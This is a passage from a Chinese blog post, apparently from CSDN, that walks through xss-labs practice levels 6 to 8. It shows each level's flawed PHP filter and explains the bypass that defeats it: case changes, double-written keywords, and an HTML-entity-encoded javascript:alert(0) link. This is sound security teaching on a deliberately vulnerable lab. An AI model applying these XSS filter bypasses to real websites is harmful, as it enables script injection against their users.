variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"&lt;script\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"&lt;scr_ipt\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"o_n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str4</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"src\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"sr_c\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str5</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"data\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"da_ta\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str6</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"href\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"hr_ef\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> \n\t\t<span class=\"token double-quoted-string string\">\"&lt;h2 align=center&gt;没有找到和\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"相关的结果.&lt;/h2&gt;\"</span><span class=\"token punctuation\">.</span>\n\t\t<span class=\"token single-quoted-string string\">'&lt;center&gt;\n\t\t&lt;form action=level6.php method=GET&gt;\n\t\t\t&lt;input name=keyword  value=\"'</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$str6</span><span class=\"token punctuation\">.</span><span class=\"token single-quoted-string string\">'\"&gt;\n\t\t\t&lt;input type=submit name=submit value=搜索 /&gt;\n\t\t&lt;/form&gt;\n\t\t&lt;/center&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<p>真是按下葫芦浮起瓢,这里把href,on,src,data,&lt;script都替换了,但是<mark>忘了大写改小写</mark></p>\n<p><img alt=\"image-20220304193307134\" src=\"..\\..\\static\\image\\ca376a0286c81bdf00ce073957cc6862.png\"/></p>\n<h3><a id=\"_690\"></a>双写绕过</h3>\n<h4><a id=\"xsslabslevel7_692\"></a>xss-labs靶场level7</h4>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n\t<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"script\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str4</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"src\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str5</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"data\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$str6</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"href\"</span><span class=\"token punctuation\">,</span><span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> \n\t\t<span class=\"token double-quoted-string string\">\"&lt;h2 align=center&gt;没有找到和\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"相关的结果.&lt;/h2&gt;\"</span><span class=\"token punctuation\">.</span>\n\t\t<span class=\"token single-quoted-string string\">'&lt;center&gt;\n\t\t&lt;form action=level7.php method=GET&gt;\n\t\t\t&lt;input name=keyword  value=\"'</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$str6</span><span class=\"token punctuation\">.</span><span class=\"token single-quoted-string string\">'\"&gt;\n\t\t\t&lt;input type=submit name=submit value=搜索 /&gt;\n\t\t\t&lt;/form&gt;\n\t\t&lt;/center&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<p>这里后端吸取了前面的教训,大写改小写,替换都注意了,但是替换的方式不对,比如如果输入oonn,那么模式匹配里里面的on并替换成啥也没有,那么oonn就成了on,同理输入<code>sscriptcript---&gt;s(script)cript---&gt;script</code>.</p>\n<p>也就是说,替换只会执行一次,不会对替换完成之后的字符串再次替换.并且恰好替换内容是啥也没有,但凡替换成一个空格也不至于双写绕过</p>\n<p><img alt=\"image-20220304193752342\" src=\"..\\..\\static\\image\\05de18a6e2184499859b8c1b06aa37de.png\"/></p>\n<h3><a id=\"HTML_728\"></a>HTML实体绕过</h3>\n<h4><a id=\"xsslabslevel8_730\"></a>xss-labs靶场level8</h4>\n<pre><code class=\"prism language-PHP\">&lt;?php \n\tini_set(\"display_errors\", 0);\n\t$str = strtolower($_GET[\"keyword\"]);\n\t$str2=str_replace(\"script\",\"scr_ipt\",$str);\n\t$str3=str_replace(\"on\",\"o_n\",$str2);\n\t$str4=str_replace(\"src\",\"sr_c\",$str3);\n\t$str5=str_replace(\"data\",\"da_ta\",$str4);\n\t$str6=str_replace(\"href\",\"hr_ef\",$str5);\n\t$str7=str_replace('\"','&amp;quot',$str6);\n\techo \n        '&lt;center&gt;\n\t\t\t&lt;form action=level8.php method=GET&gt;\n\t\t\t\t&lt;input name=keyword  value=\"'.htmlspecialchars($str).'\"&gt;\n\t\t\t\t&lt;input type=submit name=submit value=添加友情链接 /&gt;\n\t\t\t&lt;/form&gt;\n\t\t&lt;/center&gt;';\n?&gt;\n&lt;?php\n \techo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';\n?&gt;\n</code></pre>\n<p>在添加友链框里输入<code>http://baidu.com</code>点击添加友情链接之后点击友情链接可以跳转到百度,</p>\n<p>尝试使用\"伪协议\"javascript:声明使用脚本,但是后端将script替换掉了,查阅网上资料说是要用<mark>html实体绕过</mark></p>\n<p>在hackbar中输入javascript:alert(0)然后选中javascript高亮</p>\n<p><img alt=\"image-20220304201503380\" src=\"..\\..\\static\\image\\c5b62bfc0d6613822f186a0c6a29b9bd.png\"/></p>\n<p>XSS下拉框中选择HTML Characters然后变成了</p>\n<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(0)\n</code></pre>\n<p>把这个复制粘贴到友链框里就可以绕过替换了</p>\n<p><img alt=\"image-20220304201619758\" src=\"..\\..\\static\\image\\7ce80aa85ac28ea025b380b6c187f662.png\"/></p>\n<p>未完待续</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 1, "java": 0, "sql": 1, "php": 1, "time": "2022-03-06 21:52:06", "summary": "攻击攻击什么是攻击反射型靶场等级存储型靶场等级型靶场等级绕过方法使用事件靶场等级闭合标签靶场闭合引号绕过函数靶场靶场绕过对和的替换靶场大小写绕过修改靶场靶场双写绕过靶场实体绕过靶场全称跨站脚本什么是攻"}